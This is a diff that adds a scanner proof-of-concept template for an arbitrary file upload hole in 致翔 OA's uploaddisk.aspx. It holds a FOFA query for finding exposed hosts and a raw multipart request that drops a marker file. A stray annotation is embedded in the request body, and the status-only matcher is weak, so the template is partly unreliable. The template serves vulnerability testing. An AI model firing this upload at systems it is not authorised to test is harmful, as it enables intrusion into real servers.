@@ -1,0 +1,48 @@
+id: poc-ef1y2a8xt8twtaip
+info:
+  name: 致翔 OA uploaddisk 存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ef1y2a8xt8twtaip'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ef1y2a8xt8twtaip
+    fofa: body="obj.src =" && body="CreateCheckCode.aspx?id"
+http:
+- raw:
+  - 'POST /DocManage/WorkFlow/uploaddisk.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 197
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryElfcTfs456aUZQAZ
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    ------WebKitFormBoundaryElfcTfs456aUZQAZ
+
+    Content-Disposition: form-data; name="EDITFILE"; filename="em0zmh73ul.txt"
+
+    Content-Type: image/png
+
+
+    123456
+
+    ------WebKitFormBoundaryElfcTfs456aUZQAZ--
+
+
+    上传定位：
+
+    /em0zmh73ul.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
